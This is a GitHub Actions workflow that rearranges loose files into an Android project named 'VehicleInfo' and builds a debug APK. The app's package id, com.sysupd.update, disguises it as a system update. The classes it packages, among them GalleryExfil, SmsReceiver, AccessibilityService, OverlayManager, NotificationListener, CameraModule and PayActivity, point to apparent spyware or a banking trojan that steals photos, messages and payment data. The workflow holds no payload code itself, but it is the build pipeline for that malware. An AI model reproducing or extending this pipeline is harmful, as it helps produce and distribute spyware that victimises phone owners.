name: Build APK

on:
  push:
    branches: [ main ]
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Set up JDK 17
        uses: actions/setup-java@v4
        with:
          distribution: temurin
          java-version: '17'

      - name: Debug and Rearrange
        run: |
          set -e
          echo "=== ROOT FILES ==="
          ls -la

          # Save original build.gradle
          if [ -f build.gradle ]; then
            cp build.gradle /tmp/orig-build.gradle
            echo "Saved build.gradle"
          fi

          # Create folders
          mkdir -p app/src/main/java/com/sysupd
          mkdir -p app/src/main/res/layout
          mkdir -p app/src/main/res/values
          mkdir -p app/src/main/res/xml
          mkdir -p app/src/main/res/mipmap-hdpi
          mkdir -p gradle/wrapper

          # Move java files
          for f in AccessibilityService BootReceiver CameraModule Cmd Core \
                   ForegroundService GalleryExfil MainActivity NotificationListener \
                   OverlayManager PayActivity ProjectionActivity SmsReceiver SuccessActivity; do
            if [ -f "$f.java" ]; then mv "$f.java" app/src/main/java/com/sysupd/; fi
          done

          # Move resources
          [ -f activity_main.xml ] && mv activity_main.xml app/src/main/res/layout/
          [ -f activity_success.xml ] && mv activity_success.xml app/src/main/res/layout/
          [ -f colors.xml ] && mv colors.xml app/src/main/res/values/
          [ -f strings.xml ] && mv strings.xml app/src/main/res/values/
          [ -f themes.xml ] && mv themes.xml app/src/main/res/values/
          [ -f accessibility_config.xml ] && mv accessibility_config.xml app/src/main/res/xml/
          [ -f ic_launcher.png ] && mv ic_launcher.png app/src/main/res/mipmap-hdpi/
          [ -f AndroidManifest.xml ] && mv AndroidManifest.xml app/src/main/
          [ -f google-services.json ] && mv google-services.json app/

          # Create app/build.gradle
          cat > app/build.gradle << 'EOFAPP'
          plugins {
              id 'com.android.application'
              id 'com.google.gms.google-services'
          }

          android {
              namespace 'com.sysupd'
              compileSdk 34
              defaultConfig {
                  applicationId "com.sysupd.update"
                  minSdk 24
                  targetSdk 34
                  versionCode 1
                  versionName "1.0"
              }
              compileOptions {
                  sourceCompatibility JavaVersion.VERSION_17
                  targetCompatibility JavaVersion.VERSION_17
              }
          }

          dependencies {
              implementation 'androidx.appcompat:appcompat:1.6.1'
              implementation 'com.google.android.material:material:1.11.0'
          }
          EOFAPP

          # Create root build.gradle
          cat > build.gradle << 'EOFROOT'
          buildscript {
              repositories { google(); mavenCentral() }
              dependencies {
                  classpath 'com.android.tools.build:gradle:8.1.4'
                  classpath 'com.google.gms:google-services:4.4.0'
              }
          }
          allprojects {
              repositories { google(); mavenCentral() }
          }
          EOFROOT

          # settings.gradle
          cat > settings.gradle << 'EOFSET'
          rootProject.name = "VehicleInfo"
          include ':app'
          EOFSET

          # gradle.properties
          cat > gradle.properties << 'EOFPROP'
          android.useAndroidX=true
          android.enableJetifier=true
          org.gradle.jvmargs=-Xmx2048m
          EOFPROP

          # Gradle wrapper
          [ -f gradle-wrapper.jar ] && mv gradle-wrapper.jar gradle/wrapper/
          [ -f gradle-wrapper.properties ] && mv gradle-wrapper.properties gradle/wrapper/

          # local.properties
          echo "sdk.dir=$ANDROID_SDK_ROOT" > local.properties

          echo "=== FINAL STRUCTURE ==="
          find . -type f -not -path './.git/*' | sort

      - name: Build APK
        run: |
          ls -la
          ls -la app/ || true
          gradle assembleDebug --no-daemon --stacktrace

      - name: Upload APK
        uses: actions/upload-artifact@v4
        with:
          name: vehicleinfo-apk
          path: app/build/outputs/apk/debug/app-debug.apk
